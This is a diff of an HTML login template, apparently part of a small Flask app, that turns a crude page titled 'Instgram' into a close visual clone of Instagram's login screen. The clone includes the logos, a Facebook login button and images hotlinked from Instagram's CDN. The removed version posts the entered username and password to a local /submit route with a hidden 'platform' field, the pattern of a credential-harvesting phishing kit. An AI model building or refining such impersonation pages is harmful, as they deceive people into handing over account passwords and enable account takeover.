@@ -1,18 +1,86 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Instgram</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-    <h2>Sign in to Instagram</h2>
-    <form action="/submit" method="POST">
-        <input type="hidden" name="platform" value="Google">
-        <label>Email or Phone</label><br>
-        <input type="text" name="username" required><br>
-        <label>Password</label><br>
-        <input type="password" name="password" required><br>
-        <button type="submit">Sign In</button>
-    </form>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+    <div class="w-full max-w-md">
+        <!-- Main Container -->
+        <div class="bg-white border border-gray-200 p-8 rounded-sm">
+            <!-- Instagram Logo -->
+            <div class="flex justify-center mb-6">
+                <svg class="w-48" viewBox="0 0 175 51" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M53.8 8.2c-11.8 0-21.4 9.6-21.4 21.4s9.6 21.4 21.4 21.4c11.8 0 21.4-9.6 21.4-21.4S65.6 8.2 53.8 8.2zm0 34.8c-7.4 0-13.4-6-13.4-13.4s6-13.4 13.4-13.4 13.4 6 13.4 13.4-6 13.4-13.4 13.4z"/>
+                    <path d="M99.8 8.2c-11.8 0-21.4 9.6-21.4 21.4s9.6 21.4 21.4 21.4c11.8 0 21.4-9.6 21.4-21.4s-9.6-21.4-21.4-21.4zm0 34.8c-7.4 0-13.4-6-13.4-13.4s6-13.4 13.4-13.4 13.4 6 13.4 13.4-6 13.4-13.4 13.4z"/>
+                </svg>
+            </div>
+
+            <!-- Login Form -->
+            <form class="space-y-4">
+                <div>
+                    <input 
+                        type="text" 
+                        placeholder="Phone number, username, or email"
+                        class="w-full px-3 py-2 border border-gray-300 rounded-sm text-sm focus:outline-none focus:border-gray-400 bg-gray-50"
+                    >
+                </div>
+                <div>
+                    <input 
+                        type="password" 
+                        placeholder="Password"
+                        class="w-full px-3 py-2 border border-gray-300 rounded-sm text-sm focus:outline-none focus:border-gray-400 bg-gray-50"
+                    >
+                </div>
+                <button 
+                    type="submit"
+                    class="w-full bg-blue-500 text-white py-2 rounded-md font-medium hover:bg-blue-600 transition-colors"
+                >
+                    Log in
+                </button>
+            </form>
+
+            <!-- OR Separator -->
+            <div class="flex items-center my-6">
+                <div class="flex-grow border-t border-gray-300"></div>
+                <span class="px-4 text-gray-500 text-sm font-semibold">OR</span>
+                <div class="flex-grow border-t border-gray-300"></div>
+            </div>
+
+            <!-- Facebook Login -->
+            <div class="text-center">
+                <button class="text-blue-900 font-semibold flex items-center justify-center w-full">
+                    <svg class="w-5 h-5 mr-2" viewBox="0 0 24 24">
+                        <path fill="currentColor" d="M9.1 22v-8.8H6V9.7h3.1V7.2C9.1 4.1 11.2 2 14 2c1.3 0 2.5.2 2.5.2v3.1h-1.7c-1.3 0-1.6.8-1.6 1.6v2.1h3.2l-.4 3.5h-2.8V22H9.1z"/>
+                    </svg>
+                    Log in with Facebook
+                </button>
+            </div>
+
+            <!-- Forgot Password -->
+            <div class="text-center mt-4">
+                <a href="#" class="text-blue-500 text-sm">Forgot password?</a>
+            </div>
+        </div>
+
+        <!-- Sign Up Box -->
+        <div class="bg-white border border-gray-200 p-4 mt-2 text-center rounded-sm">
+            <p class="text-sm">
+                Don't have an account? 
+                <a href="#" class="text-blue-500 font-semibold">Sign up</a>
+            </p>
+        </div>
+
+        <!-- Get App -->
+        <div class="text-center mt-6">
+            <p class="text-sm mb-4">Get the app.</p>
+            <div class="flex justify-center space-x-2">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/YeT8e8HlkD-.png" alt="App Store" class="h-10">
+                <img src="https://static.cdninstagram.com/rsrc.php/v3/y5/r/TJztmXpWTmS.png" alt="Google Play" class="h-10">
+            </div>
+        </div>
+    </div>
 </body>
 </html>
